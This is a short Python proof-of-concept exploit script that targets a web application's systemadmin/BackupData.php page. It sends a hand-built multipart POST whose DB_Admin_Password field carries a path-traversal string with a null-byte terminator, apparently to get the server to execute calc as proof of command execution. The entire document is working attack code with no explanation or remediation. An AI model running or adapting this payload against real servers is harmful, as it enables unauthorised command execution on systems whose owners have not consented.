import socket

host = 'localhost'
path = '/tems'
port = 80

def run_command():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)

    body = '------x\r\n'\
           'Content-Disposition: form-data; name="toFile"\r\n'\
           '\r\n'\
           './a\r\n'\
           '------x\r\n'\
           'Content-Disposition: form-data; name="DB_Admin_id"\r\n'\
           '\r\n'\
           'a\r\n'\
           '------x\r\n'\
           'Content-Disposition: form-data; name="DB_Admin_Password"\r\n'\
           '\r\n'\
           '../../../../../../../calc\x00a\r\n'\
           '------x--\r\n'\
           '\r\n'


    s.send('POST %s/systemadmin/BackupData.php HTTP/1.1\r\n'
           'Host: localhost\r\n'
           'Proxy-Connection: keep-alive\r\n'
           'User-Agent: x\r\n'
           'Content-Length: %d\r\n'
           'Cache-Control: max-age=0\r\n'
           'Origin: null\r\n'
           'Content-Type: multipart/form-data; boundary=----x\r\n'
           'Accept: text/html\r\n'
           'Accept-Language: en-US,en;q=0.8\r\n'
           'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'
           '\r\n%s' % (path, len(body), body))

    print 'request sent, check for calc using the task manger'

run_command()